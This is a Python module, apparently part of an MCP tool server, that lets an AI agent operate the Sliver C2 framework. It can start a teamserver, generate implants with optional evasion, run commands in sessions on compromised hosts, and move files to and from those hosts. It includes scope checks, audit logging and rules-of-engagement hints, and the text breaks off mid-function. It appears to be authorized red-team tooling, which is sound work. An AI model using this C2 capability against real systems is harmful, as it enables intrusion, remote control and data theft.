"""Sliver C2 tools.

Sliver exposes its operator-side API via gRPC over mTLS using an operator
config file exported from ``sliver-server``. Ideally we would use the
``sliver-py`` SDK, but for portability we drive the official
``sliver-client`` binary in one-shot mode (``--command "..."``) and parse
its stdout.

This keeps the attack surface small: no long-lived TLS keys in memory,
and any failure is trivially reproducible from a shell.

Tools:
    * ``sliver_start_server``        start the teamserver in the background
    * ``sliver_stop_server``         stop the teamserver
    * ``sliver_server_status``       server running? (PID-file check)
    * ``sliver_run_command``         run a single operator command, return stdout
    * ``sliver_list_sessions``       structured alias for `sessions`
    * ``sliver_list_listeners``      structured alias for `jobs`
    * ``sliver_generate_implant``    build an implant binary
    * ``sliver_execute_in_session``  run a shell/implant command inside a session
"""

from __future__ import annotations

import os
import re
import signal
import subprocess
import sys
from pathlib import Path
from typing import Any

from ..config import Settings
from ..executor import ExecutorError, resolve_binary, run_command
from ..logging import audit_event
from ..security import ScopeGuard
from .base import ToolModule, ToolResult, ToolSpec

_SERVER_PID_FILE = "sliver-server.pid"


class SliverModule(ToolModule):
    id = "sliver"

    def __init__(self, settings: Settings, scope_guard: ScopeGuard) -> None:
        super().__init__(settings, scope_guard)
        block = self.settings.tools.sliver
        self._server_hint: str | None = getattr(block, "server_binary", None) or getattr(
            block, "binary", None
        )
        self._client_hint: str | None = getattr(block, "client_binary", None)
        self._operator_config: str | None = getattr(block, "operator_config", None)
        runs_dir = settings.expanded_path(settings.execution.working_dir)
        runs_dir.mkdir(parents=True, exist_ok=True)
        self._pid_file = runs_dir / _SERVER_PID_FILE

    def _server_binary(self) -> str:
        return resolve_binary(self._server_hint, "sliver-server")

    def _client_binary(self) -> str:
        return resolve_binary(self._client_hint, "sliver-client")

    def specs(self) -> list[ToolSpec]:
        return [
            ToolSpec(
                name="sliver_start_server",
                description=(
                    "Start sliver-server in the background. Persistent state lives in "
                    "~/.sliver/. First-time startup initialises certificates and can take ~30s."
                ),
                input_schema={
                    "type": "object",
                    "properties": {
                        "daemon": {
                            "type": "boolean",
                            "default": True,
                            "description": "Run detached from the invoking TTY (default). "
                            "Set false only for interactive debugging.",
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_start_server,
                dangerous=True,
                tags=["c2"],
                when_to_use=[
                    "Starting a fresh C2 engagement — first Sliver call per deploy.",
                    "After system reboot — sliver-server does not auto-restart.",
                    "Want unattended daemon-mode operation (default).",
                ],
                when_not_to_use=[
                    "Server already running — call sliver_server_status first.",
                    "Ephemeral CI / container without persistent ~/.sliver — state won't survive.",
                    "Host has no outbound network — listener registration works but implant "
                    "callbacks won't reach you.",
                    "Multiple sliver-server instances on one host — they fight for the gRPC "
                    "port (31337) and fail to start.",
                ],
                prerequisites=[
                    "sliver-server binary installed (see BishopFox/sliver releases).",
                    "Writable ~/.sliver/ for certs — first run creates ~200 MB of CA + keys.",
                    "gRPC port 31337 and any intended listener ports free (e.g. 80/443).",
                ],
                follow_ups=[
                    "Wait ~30s on first start for cert init — poll sliver_server_status.",
                    "Create a per-operator config via sliver_run_command 'new-operator ...' "
                    "before sharing with teammates.",
                    "Register listeners (https/mtls/dns) via sliver_run_command before "
                    "generating implants.",
                ],
                pitfalls=[
                    "First start takes 30+ seconds for cert init; subsequent starts < 5s. "
                    "Don't retry during init or you'll race on .sliver/.",
                    "Server persists across sliver-client disconnects — remember to call "
                    "sliver_stop_server at engagement end or you leak a C2.",
                    "Windows uses CTRL_BREAK for shutdown (not SIGTERM); launched in a new "
                    "process group by design.",
                    "If ~/.sliver is corrupted, server fails silently — inspect the .log file "
                    "next to the PID file.",
                ],
                local_model_hints=(
                    "Call this ONCE per engagement. If unsure whether server is already up, "
                    "use sliver_server_status first — don't retry start."
                ),
                example_conversation=(
                    'User: "spin up my C2"\n'
                    "Agent -> sliver_server_status (first, expect running=false)\n"
                    '          -> sliver_start_server({"daemon": true})\n'
                    "Response: 'PID 1234, logs at ~/.kestrel/runs/sliver-server.pid.log'\n"
                    "Agent waits 30s then sliver_server_status again to confirm init."
                ),
            ),
            ToolSpec(
                name="sliver_stop_server",
                description=(
                    "Stop the sliver-server process whose PID was recorded by "
                    "sliver_start_server. Won't touch a server launched outside MCP."
                ),
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_stop_server,
                tags=["c2"],
                when_to_use=[
                    "End of engagement — clean up running C2 cleanly.",
                    "Before host reboot / maintenance for a graceful shutdown.",
                    "Server is misbehaving and you want a clean restart.",
                ],
                when_not_to_use=[
                    "Active implants/sessions exist — stopping kills them all with no grace "
                    "period. Run sliver_list_sessions first.",
                    "sliver_list_sessions errored or could not confirm session state; "
                    "do not treat an error as zero sessions.",
                    "Other operators are mid-engagement on this server.",
                    "Server was NOT started by this MCP — only the pid-file-tracked one stops.",
                ],
                prerequisites=[
                    "PID file exists at ~/.kestrel/runs/sliver-server.pid (set by start).",
                    "Current user can signal that PID (same uid, or CTRL_BREAK rights on Windows).",
                ],
                follow_ups=[
                    "Verify shutdown with sliver_server_status (running=false).",
                    "Archive the .log next to the PID file into engagement artifacts before the "
                    "next start rotates it.",
                ],
                pitfalls=[
                    "Stop kills ALL implants/sessions/listeners with no grace window.",
                    "Stale PID file with dead process returns ok without action.",
                    "Windows: needs CTRL_BREAK_EVENT into the server's process group, which "
                    "sliver_start_server sets up via CREATE_NEW_PROCESS_GROUP — don't bypass.",
                    "Second call after success is a no-op (PID file already removed).",
                ],
                local_model_hints=(
                    "This stops ONLY the server YOU started via sliver_start_server. "
                    "Won't kill an externally-launched sliver-server. If sliver_list_sessions "
                    "errors, STOP and ask; an error is not proof there are no sessions."
                ),
            ),
            ToolSpec(
                name="sliver_server_status",
                description=(
                    "Return whether the MCP-started sliver-server is running. "
                    "PID-file + signal-0 probe; does NOT verify gRPC responsiveness."
                ),
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_server_status,
                tags=["c2", "meta"],
                when_to_use=[
                    "Before any Sliver operation — verify the server is up.",
                    "Troubleshooting 'connection refused' errors from sliver_run_command.",
                    "Waiting for first-run cert init to finish (poll every few seconds).",
                ],
                prerequisites=[
                    "No Sliver client connection required; this checks only the MCP PID file.",
                    "Useful even when operator config is broken because it does not contact gRPC.",
                ],
                follow_ups=[
                    "running=true -> proceed with your intended Sliver op.",
                    "running=false -> sliver_start_server, or realise other Sliver calls will fail.",
                ],
                pitfalls=[
                    "Only checks PID-file presence + process alive — a zombied server may "
                    "report running=true but refuse gRPC calls. If commands fail despite "
                    "running=true, stop+start the server.",
                    "Stale PID file from a crashed server is auto-cleaned (reports running=false).",
                    "Does not see sliver-server processes launched outside this MCP.",
                ],
                local_model_hints=(
                    "Cheap and fast (< 100 ms). ALWAYS call before heavy Sliver ops to avoid "
                    "wasting a 5-minute command timeout when the server is down."
                ),
            ),
            ToolSpec(
                name="sliver_run_command",
                description=(
                    "Execute ONE raw sliver-client operator command and return stdout. "
                    "Escape hatch for commands not covered by dedicated tools "
                    "(e.g. 'canaries', 'operators', 'armory install ...', 'update')."
                ),
                input_schema={
                    "type": "object",
                    "required": ["command"],
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": (
                                "Full sliver operator command line (what you'd type at the "
                                "sliver> prompt). NOT a shell command. e.g. 'https --domain "
                                "c2.example.com --lport 443'."
                            ),
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                            "description": (
                                "Maximum wall time in seconds. Default comes from "
                                "execution.timeout_sec (300). Bump for 'armory install' (> 60s) "
                                "or 'update' (may pull large artifacts)."
                            ),
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_run_command,
                dangerous=True,
                tags=["c2", "power-user"],
                when_to_use=[
                    "A dedicated tool doesn't exist for what you need (e.g. armory, canaries, "
                    "operators, update).",
                    "Debugging — 'help', 'version', 'sessions -h' etc.",
                    "One-off admin tasks: creating operator configs, registering listeners.",
                ],
                when_not_to_use=[
                    "Dedicated tool exists — use sliver_list_sessions over "
                    "sliver_run_command('sessions'); use sliver_list_listeners over 'jobs'.",
                    "Session-scoped ops ('use <id>; whoami') — use sliver_execute_in_session "
                    "instead; it validates session id and audits properly.",
                    "Command string contains cleartext secrets — first 200 chars are logged to "
                    "audit.log.",
                    "Need structured output (table parsed to JSON) — this returns raw stdout only.",
                ],
                prerequisites=[
                    "sliver-client binary resolvable (`kestrel doctor` checks).",
                    "Operator config in ~/.sliver-client/configs/ or tools.sliver.operator_config "
                    "set in settings.",
                    "sliver_server_status -> running=true.",
                ],
                follow_ups=[
                    "If the command was stateful (listener registration, implant generation), "
                    "verify the change via sliver_list_listeners or sliver_list_sessions.",
                    "For frequently-used commands, ask the author to add a dedicated tool — "
                    "structured output is always better than raw stdout parsing.",
                ],
                pitfalls=[
                    "No scope enforcement beyond what the operator config permits — this is a "
                    "raw shell into the server.",
                    "Output is raw stdout in the structured.stdout field; ASCII tables are NOT "
                    "parsed (use sliver_list_sessions/_listeners for parsed rows).",
                    "Long-running commands may hit timeout_sec and leave partial state.",
                    "gRPC drop mid-call loses stdout; no retry.",
                ],
                local_model_hints=(
                    "Escape hatch. ALWAYS check whether a dedicated tool covers the intent before "
                    "calling this. Command string is the sliver> prompt input, not a shell "
                    "command. Audit log captures first 200 chars — don't embed credentials."
                ),
                example_conversation=(
                    'User: "register an HTTPS listener on 443 for c2.example.com"\n'
                    "Agent -> sliver_run_command({\n"
                    '    "command": "https --domain c2.example.com --lport 443"\n'
                    "})\n"
                    "Response: 'Started HTTPS listener: 1 (0.0.0.0:443)'\n"
                    "Agent follows up with sliver_list_listeners to confirm id + config."
                ),
            ),
            ToolSpec(
                name="sliver_list_sessions",
                description="List active sliver sessions (parsed into a structured list).",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_list_sessions,
                tags=["c2", "recon"],
                when_to_use=[
                    "Before any session-scoped operation: choose the exact session id first.",
                    "After a new implant callback to confirm host, user, transport, and health.",
                    "Before sliver_stop_server to avoid killing active operator work by surprise.",
                ],
                when_not_to_use=[
                    "Need raw Sliver table output for troubleshooting; use sliver_run_command.",
                    "Server is down; call sliver_server_status first to avoid timeout noise.",
                ],
                prerequisites=[
                    "sliver_server_status reports running=true.",
                    "sliver-client binary and operator config are usable.",
                ],
                follow_ups=[
                    "If count=0, verify listeners with sliver_list_listeners and re-check callback routing.",
                    "If multiple sessions exist, ask the operator to select by session id, host, user, and OS.",
                    "For the selected session, use sliver_execute_in_session with a benign validation command first.",
                ],
                pitfalls=[
                    "Session ids are short-lived; re-list immediately before executing in a session.",
                    "A stale or disconnected row may still appear briefly; failed commands should trigger re-list.",
                    "Parsed rows are best-effort; inspect raw when columns look wrong.",
                    "Do not infer authorization from session presence; scope and rules of engagement still apply.",
                ],
                local_model_hints=(
                    "Call sliver_server_status first. If running=false or this tool errors, STOP. "
                    "Never guess a session_id from memory; use the freshest list and ask when more "
                    "than one plausible session exists."
                ),
            ),
            ToolSpec(
                name="sliver_list_listeners",
                description="List active C2 listeners / jobs (HTTP, HTTPS, mTLS, DNS, WG).",
                input_schema={"type": "object", "properties": {}, "additionalProperties": False},
                handler=self._handle_list_jobs,
                tags=["c2", "recon"],
                when_to_use=[
                    "Before generating an implant: verify the intended protocol listener exists.",
                    "After sliver_run_command creates/stops a listener to confirm actual state.",
                    "When callbacks fail: check protocol, bind address, and listener id.",
                ],
                when_not_to_use=[
                    "Need to create a new listener; use sliver_run_command with the explicit listener command.",
                    "Server is down; call sliver_server_status first.",
                ],
                prerequisites=[
                    "sliver_server_status reports running=true.",
                    "Operator config can connect to the server.",
                ],
                follow_ups=[
                    "If the listener is missing, create it explicitly and re-run this tool.",
                    "If protocol/port differs from the planned implant, fix listener or regenerate with matching args.",
                    "After confirming a listener, sliver_generate_implant can use the matching callback address.",
                ],
                pitfalls=[
                    "A listener bound locally may still be unreachable from the target network.",
                    "Jobs/listeners can be stopped by other operators; re-check before payload generation.",
                    "Parsed rows are best-effort across Sliver versions; inspect raw when output format changes.",
                ],
                local_model_hints=(
                    "Call sliver_server_status first. Use this as the gate before implant generation. "
                    "If this tool errors or returns no matching listener, STOP. No listener, no "
                    "implant generation."
                ),
            ),
            ToolSpec(
                name="sliver_generate_implant",
                description=(
                    "Generate an implant binary. The operator supplies the callback "
                    "(mTLS, HTTPS, HTTP, DNS) and target OS/arch. The output file is "
                    "written to the working directory by default."
                ),
                input_schema={
                    "type": "object",
                    "required": ["callback_addr", "protocol"],
                    "properties": {
                        "protocol": {
                            "type": "string",
                            "enum": ["mtls", "https", "http", "dns", "wg"],
                            "description": (
                                "Callback transport to embed. Must match an already-running "
                                "Sliver listener/job."
                            ),
                        },
                        "callback_addr": {
                            "type": "string",
                            "description": (
                                "In-scope callback host/address, optionally with port, e.g. "
                                "'c2.lab:443'. This is scope-checked before generation."
                            ),
                        },
                        "os": {
                            "type": "string",
                            "enum": ["windows", "linux", "darwin"],
                            "default": "windows",
                            "description": "Target operating system for the implant artifact.",
                        },
                        "arch": {
                            "type": "string",
                            "enum": ["amd64", "386", "arm64"],
                            "default": "amd64",
                            "description": "Target CPU architecture; amd64 is the common default.",
                        },
                        "format": {
                            "type": "string",
                            "enum": ["exe", "shellcode", "shared", "service"],
                            "default": "exe",
                            "description": (
                                "Artifact format. Use exe for ordinary lab execution; shellcode, "
                                "shared, and service require a clear operator reason."
                            ),
                        },
                        "beacon": {
                            "type": "boolean",
                            "default": False,
                            "description": "Build beacon implant (async check-in).",
                        },
                        "beacon_interval_sec": {
                            "type": "integer",
                            "minimum": 10,
                            "default": 60,
                            "description": (
                                "Beacon check-in interval in seconds when beacon=true. Higher is "
                                "quieter but slower for interactive work."
                            ),
                        },
                        "beacon_jitter_pct": {
                            "type": "integer",
                            "minimum": 0,
                            "maximum": 100,
                            "default": 30,
                            "description": (
                                "Beacon timing jitter percentage when beacon=true. Keep explicit "
                                "so operators understand response-time tradeoffs."
                            ),
                        },
                        "evasion": {
                            "type": "boolean",
                            "default": False,
                            "description": (
                                "Enable Sliver's evasion build option only when rules explicitly "
                                "allow it. Keep false for ordinary validation."
                            ),
                        },
                        "skip_symbols": {
                            "type": "boolean",
                            "default": True,
                            "description": (
                                "Strip symbols from the artifact. Default true; set false only "
                                "when debugging or analysis requires symbols."
                            ),
                        },
                        "save_dir": {
                            "type": "string",
                            "description": (
                                "Directory where Sliver writes the artifact. Prefer a controlled "
                                "engagement artifact directory."
                            ),
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_generate,
                dangerous=True,
                requires_scope_field="callback_addr",
                tags=["c2", "payload"],
                when_to_use=[
                    "Authorized lab/CTF engagement needs a new implant artifact for a known target OS/arch.",
                    "A matching listener/job is already running and verified with sliver_list_listeners.",
                    "Callback address is inside the declared engagement scope and reachable from the target network.",
                ],
                when_not_to_use=[
                    "No listener exists for the selected protocol; create and verify it first.",
                    "Target OS/arch is unknown; gather inventory instead of guessing.",
                    "Callback host is outside scope, third-party, or not controlled by the engagement.",
                    "Operator asks for evasion/persistence without explicit rules-of-engagement approval.",
                    "A suitable implant already exists; avoid generating duplicate uncontrolled artifacts.",
                ],
                prerequisites=[
                    "sliver_server_status reports running=true.",
                    "sliver_list_listeners shows the intended protocol/port listener is active.",
                    "callback_addr passes scope validation and routes back to the operator infrastructure.",
                    "Operator has chosen OS, arch, format, and beacon/session mode intentionally.",
                ],
                follow_ups=[
                    "Record artifact path, protocol, callback, OS/arch, build options, and hash in notes.",
                    "Store the artifact only in the engagement artifacts directory; do not scatter copies.",
                    "After authorized delivery/execution, poll sliver_list_sessions for the expected callback.",
                    "At engagement end, archive or destroy artifacts according to rules of engagement.",
                ],
                pitfalls=[
                    "Generating before listener verification creates dead artifacts and wastes operator time.",
                    "Protocol/callback mismatch is the most common failure: listener and implant must agree.",
                    "Evasion is not a magic bypass and may violate competition rules; keep it false by default.",
                    "Beacon implants are less interactive; choose session vs beacon based on the task.",
                    "Generated payloads are sensitive artifacts; never paste or upload them casually.",
                ],
                local_model_hints=(
                    "Before calling this: sliver_server_status, then sliver_list_listeners, then confirm "
                    "callback_addr is in scope. If status/listener checks error or no matching listener "
                    "exists, STOP. Prefer evasion=false. Do not generate implants for uncontrolled "
                    "callback infrastructure."
                ),
                example_conversation=(
                    'User: "build a Windows lab implant for our mtls listener on c2.lab:443"\n'
                    "Agent -> sliver_list_listeners (confirm mtls listener is active)\n"
                    "Agent -> sliver_generate_implant({\n"
                    '    "protocol": "mtls", "callback_addr": "c2.lab:443",\n'
                    '    "os": "windows", "arch": "amd64", "format": "exe",\n'
                    '    "beacon": false, "evasion": false\n'
                    "})\n"
                    "Agent records artifact path and hash, then polls sliver_list_sessions after delivery."
                ),
            ),
            ToolSpec(
                name="sliver_execute_in_session",
                description=("Run a command inside a given sliver session and return stdout."),
                input_schema={
                    "type": "object",
                    "required": ["session_id", "command"],
                    "properties": {
                        "session_id": {
                            "type": "string",
                            "description": (
                                "Exact session ID from a fresh sliver_list_sessions result. "
                                "Do not guess or reuse stale ids."
                            ),
                        },
                        "command": {
                            "type": "string",
                            "description": (
                                "Sliver command to run after `use <session>`. "
                                "Use benign validation commands first, e.g. 'whoami', "
                                "'hostname', or 'ps'."
                            ),
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                            "description": (
                                "Maximum wall time in seconds for the session command. "
                                "Keep short for checks; increase only for known long tasks."
                            ),
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_execute_in_session,
                dangerous=True,
                tags=["c2", "post-ex"],
                when_to_use=[
                    "Operator selected one active session from a fresh sliver_list_sessions result.",
                    "Running a scoped, intentional command inside a lab/CTF session.",
                    "Need structured audit around a session-scoped Sliver command instead of raw run_command.",
                ],
                when_not_to_use=[
                    "No fresh session list exists; call sliver_list_sessions first.",
                    "Multiple sessions match and the operator has not chosen the exact session id.",
                    "Command would collect secrets, modify persistence, or disrupt service without explicit approval.",
                    "A non-session Sliver command is intended; use sliver_run_command instead.",
                    "The target represented by the session is outside the engagement scope.",
                ],
                prerequisites=[
                    "sliver_server_status reports running=true.",
                    "sliver_list_sessions was called immediately before this tool.",
                    "session_id matches the selected active session and operator intent.",
                    "The command is allowed by the rules of engagement and expected to finish within timeout_sec.",
                ],
                follow_ups=[
                    "Summarize stdout/stderr and note whether the session still appears healthy.",
                    "If the command fails, re-run sliver_list_sessions before retrying.",
                    "For host inventory, store stable facts as engagement targets or notes instead of repeating commands.",
                    "For any sensitive output, avoid pasting raw secrets; summarize and store securely.",
                ],
                pitfalls=[
                    "Command text is audited (first 200 chars); never embed credentials or tokens.",
                    "Session ids can expire between list and execute; retry only after re-listing.",
                    "Interactive shells can hang; prefer one-shot commands with bounded timeout_sec.",
                    "Composite command is built as 'use <session>; <command>'; session id validation is strict.",
                    "Do not assume command syntax is a local OS shell; it is parsed by sliver-client.",
                ],
                local_model_hints=(
                    "Always call sliver_server_status and sliver_list_sessions first. If status or "
                    "session listing errors, STOP. If more than one session exists, ask for confirmation "
                    "by host/user/OS/session_id. Start with benign inventory commands; do not run "
                    "destructive, persistence, credential, or exfiltration actions unless the operator "
                    "explicitly requested them within scope."
                ),
                example_conversation=(
                    'User: "check who we are on session abc123"\n'
                    "Agent -> sliver_list_sessions (confirm abc123 is active and scoped)\n"
                    "Agent -> sliver_execute_in_session({\n"
                    '    "session_id": "abc123", "command": "whoami", "timeout_sec": 30\n'
                    "})\n"
                    "Agent summarizes the returned username and recommends re-listing sessions before "
                    "the next action."
                ),
            ),
            ToolSpec(
                name="sliver_upload_file",
                description=(
                    "Upload a local file into an active sliver session. "
                    "This is scoped: the session's target host must be in authorized_scope."
                ),
                input_schema={
                    "type": "object",
                    "required": ["session_id", "local_path", "remote_path"],
                    "properties": {
                        "session_id": {
                            "type": "string",
                            "description": "Exact session ID from sliver_list_sessions.",
                        },
                        "local_path": {
                            "type": "string",
                            "description": "Absolute path to the file on the operator machine.",
                        },
                        "remote_path": {
                            "type": "string",
                            "description": "Destination path on the compromised host.",
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                            "default": 300,
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_upload,
                dangerous=True,
                tags=["c2", "post-ex", "file-ops"],
            ),
            ToolSpec(
                name="sliver_download_file",
                description=(
                    "Download a file from an active sliver session to the operator machine. "
                    "The downloaded file is placed in the engagement working directory."
                ),
                input_schema={
                    "type": "object",
                    "required": ["session_id", "remote_path"],
                    "properties": {
                        "session_id": {
                            "type": "string",
                            "description": "Exact session ID from sliver_list_sessions.",
                        },
                        "remote_path": {
                            "type": "string",
                            "description": "Path to the file on the compromised host.",
                        },
                        "local_name": {
                            "type": "string",
                            "description": "Optional local filename override.",
                        },
                        "timeout_sec": {
                            "type": "integer",
                            "minimum": 5,
                            "maximum": 1800,
                            "default": 300,
                        },
                    },
                    "additionalProperties": False,
                },
                handler=self._handle_download,
                dangerous=True,
                tags=["c2", "post-ex", "file-ops"],
            ),
        ]

    # ------------------------------------------------------------------ server

    async def _handle_start_server(self, arguments: dict[str, Any]) -> ToolResult:
        if self._pid_file.exists():
            try:
                pid = int(self._pid_file.read_text("utf-8").strip())
                if _alive(pid):
                    return ToolResult.error(f"sliver-server already running PID {pid}.")
            except (ValueError, OSError):
                pass

        binary = self._server_binary()
        daemon = bool(arguments.get("daemon", True))
        argv: list[str] = [binary]
        if daemon:
            argv.append("daemon")

        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would start: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv},
            )

        log_path = self._pid_file.with_suffix(".log")
        try:
            log_fh = log_path.open("ab")
            proc = subprocess.Popen(  # noqa: S603
                argv,
                stdout=log_fh,
                stderr=log_fh,
                stdin=subprocess.DEVNULL,
                cwd=str(Path(binary).parent),
                creationflags=(
                    subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0
                ),
            )
        except OSError as exc:
            return ToolResult.error(f"Failed to spawn sliver-server: {exc}")

        self._pid_file.write_text(str(proc.pid), encoding="utf-8")
        audit_event(self.log, "sliver.server.start", pid=proc.pid)
        return ToolResult(
            text=f"sliver-server started, PID {proc.pid}. Logs: {log_path}",
            structured={"pid": proc.pid, "log_path": str(log_path)},
        )

    async def _handle_stop_server(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="sliver-server is not running.", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            self._pid_file.unlink(missing_ok=True)
            return ToolResult.error("PID file malformed, cleaned up.")
        if not _alive(pid):
            self._pid_file.unlink(missing_ok=True)
            return ToolResult(text=f"PID {pid} already exited.", structured={"running": False})
        try:
            if sys.platform == "win32":
                os.kill(pid, signal.CTRL_BREAK_EVENT)
            else:
                os.kill(pid, signal.SIGTERM)
        except OSError as exc:
            return ToolResult.error(f"Failed to stop PID {pid}: {exc}")
        self._pid_file.unlink(missing_ok=True)
        audit_event(self.log, "sliver.server.stop", pid=pid)
        return ToolResult(text=f"Stopped sliver-server PID {pid}.", structured={"stopped_pid": pid})

    async def _handle_server_status(self, _arguments: dict[str, Any]) -> ToolResult:
        if not self._pid_file.exists():
            return ToolResult(text="not running", structured={"running": False})
        try:
            pid = int(self._pid_file.read_text("utf-8").strip())
        except ValueError:
            return ToolResult.error("PID file corrupt")
        running = _alive(pid)
        if not running:
            self._pid_file.unlink(missing_ok=True)
        return ToolResult(
            text=f"pid={pid} running={running}", structured={"pid": pid, "running": running}
        )

    # ------------------------------------------------------------------ client

    async def _run_client(self, command: str, timeout_sec: int | None = None) -> ToolResult:
        try:
            binary = self._client_binary()
        except ExecutorError as exc:
            return ToolResult.error(str(exc))

        argv = [binary, "--command", command]
        if self._operator_config:
            argv += ["--config", self._operator_config]

        timeout = int(timeout_sec or self.settings.execution.timeout_sec)
        if self.settings.security.dry_run:
            return ToolResult(
                text=f"[dry-run] would run: {' '.join(argv)}",
                structured={"dry_run": True, "argv": argv},
            )

        result = await run_command(
            argv,
            timeout_sec=timeout,
            max_output_bytes=self.settings.execution.max_output_bytes,
        )
        return ToolResult(
            text=(
                f"sliver '{command[:60]}{'…' if len(command) > 60 else ''}' "
                f"-> exit={result.exit_code} dur={result.duration_sec:.1f}s"
            ),
            structured={
                "command": command,
                "exit_code": result.exit_code,
                "stdout": result.stdout,
                "stderr_tail": result.stderr[-2000:],
                "duration_sec": result.duration_sec,
                "truncated": result.truncated,
            },
            is_error=not result.ok,
        )

    async def _handle_run_command(self, arguments: dict[str, Any]) -> ToolResult:
        command = arguments["command"]
        audit_event(self.log, "sliver.run_command", command=command[:200])
        return await self._run_client(command, timeout_sec=arguments.get("timeout_sec"))

    async def _handle_list_sessions(self, _arguments: dict[str, Any]) -> ToolResult:
        result = await self._run_client("sessions")
        if result.is_error:
            return result
        stdout = (result.structured or {}).get("stdout", "")
        sessions = _parse_table(stdout)
        audit_event(self.log, "sliver.sessions", count=len(sessions))
        return ToolResult(
            text=f"{len(sessions)} active session(s).",
            structured={"count": len(sessions), "sessions": sessions, "raw": stdout[-4000:]},
        )

    async def _handle_list_jobs(self, _arguments: dict[str, Any]) -> ToolResult:
        result = await self._run_client("jobs")
        if result.is_error:
            return result
        stdout = (result.structured or {}).get("stdout", "")
        jobs = _parse_table(stdout)
        return ToolResult(
            text=f"{len(jobs)} active listener/job(s).",
            structured={"count": len(jobs), "jobs": jobs, "raw": stdout[-4000:]},
        )

    async def _handle_generate(self, arguments: dict[str, Any]) -> ToolResult:
        callback = arguments["callback_addr"]
        protocol = arguments["protocol"]
        await self.ensure_scope(callback, tool_name="sliver_generate_implant")

        os_name = arguments.get("os", "windows")
        arch = arguments.get("arch", "amd64")
        fmt = arguments.get("format", "exe")
        beacon = bool(arguments.get("beacon"))
        save_dir = arguments.get("save_dir")

        cmd_parts = ["generate"]
        if beacon:
            cmd_parts.append("beacon")
        cmd_parts += [f"--{protocol}", callback]
        cmd_parts += ["--os", os_name, "--arch", arch, "--format", fmt]
        if beacon:
            cmd_parts += ["--seconds", str(int(arguments.get("beacon_interval_sec", 60)))]
            cmd_parts += ["--jitter", str(int(arguments.get("beacon_jitter_pct", 30)))]
        if arguments.get("evasion"):
            cmd_parts.append("--evasion")
        if arguments.get("skip_symbols", True):
            cmd_parts.append("--skip-symbols")
        if save_dir:
            cmd_parts += ["--save", save_dir]

        command = " ".join(cmd_parts)
        audit_event(
            self.log,
            "sliver.generate",
            protocol=protocol,
            callback=callback,
            os=os_name,
            arch=arch,
            format=fmt,
            beacon=beacon,
        )
        return await self._run_client(command, timeout_sec=arguments.get("timeout_sec", 900))

    async def _handle_execute_in_session(self, arguments: dict[str, Any]) -> ToolResult:
        session_id = arguments["session_id"]
        command = arguments["command"]
        if not re.match(r"^[A-Za-z0-9_-]{1,64}$", session_id):
            return ToolResult.error(f"Illegal session id: {session_id!r}")
        composite = f"use {session_id}; {command}"
        audit_event(self.log, "sliver.exec_in_session", session=session_id, command=command[:200])
        return await self._run_client(composite, timeout_sec=arguments.get("timeout_sec"))

    async def _handle_upload(self, arguments: dict[str, Any]) -> ToolResult:
        session_id = arguments["session_id"]
        local_path = arguments["local_path"]
        remote_path = arguments["remote_path"]
        if not re.match(r"^[A-Za-z0-9_-]{1,64}$", session_id):
            return ToolResult.error(f"Illegal session id: {session_id!r}")
        local = Path(local_path)
        if not local.is_file():
            return ToolResult.error(f"Local file not found: {local_path}")
        composite = f"use {session_id}; upload {local_path} {remote_path}"
        audit_event(
            self.log,
            "sliver.upload",
            session=session_id,
            remote_path=remote_path,
            local_path=local_path,
        )
        return await self._run_client(composite, timeout_sec=arguments.get("timeout_sec"))

    async def _handle_download(self, arguments: dict[str, Any]) -> ToolResult:
        session_id = arguments["session_id"]
        remote_path = arguments["remote_path"]
        if not re.match(r"^[A-Za-z0-9_-]{1,64}$", session_id):
            return ToolResult.error(f"Illegal session id: {session_id!r}")
        save_dir = self.settings.expanded_path(self.settings.execution.working_dir)
        save_dir.mkdir(parents=True, exist_ok=True)
        composite = f"use {session_id}; download {remote_path}"
        audit_event(
            self.log,
            "sliver.download",
            session=session_id,
            remote_path=remote_path,
        )
        result = await self._run_client(composite, timeout_sec=arguments.get("timeout_sec"))
        if not result.is_error:
            # Sliver downloads to ~/.sliver/downloads/ by default; inform the operator.
            text = (
                f"Download command sent for '{remote_path}'. "
                f"Sliver client typically writes downloaded files to ~/.sliver/downloads/. "
                f"Check the structured stdout for the exact saved path."
            )
            return ToolResult(
                text=text,
                structured=result.structured,
            )
        return result


def _alive(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            output = subprocess.check_output(  # noqa: S603,S607
                ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                text=True,
                stderr=subprocess.DEVNULL,
            )
            return str(pid) in output
        except (OSError, subprocess.SubprocessError):
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def _parse_table(output: str) -> list[dict[str, str]]:
    """Best-effort parse of the ASCII table sliver-client prints.

    Uses the first '====' or blank-bordered line as the column separator;
    falls back to splitting on two+ spaces. Returns [] if the output
    doesn't look tabular.
    """

    lines = [ln for ln in output.splitlines() if ln.strip()]
    if not lines:
        return []

    header_idx = -1
    for i, line in enumerate(lines):
        if re.match(r"^[=]{3,}", line) or re.match(r"^\s*[A-Z][A-Z ]+\s{2,}", line):
            header_idx = i
            break
    if header_idx == -1:
        return []

    header = lines[header_idx]
    rows = lines[header_idx + 1 :]

    col_positions: list[int] = []
    for m in re.finditer(r"\S+(?:\s\S+)*", header):
        col_positions.append(m.start())
    if not col_positions:
        return []
    columns = [header[s:e].strip() for s, e in _pairs(col_positions, len(header))]

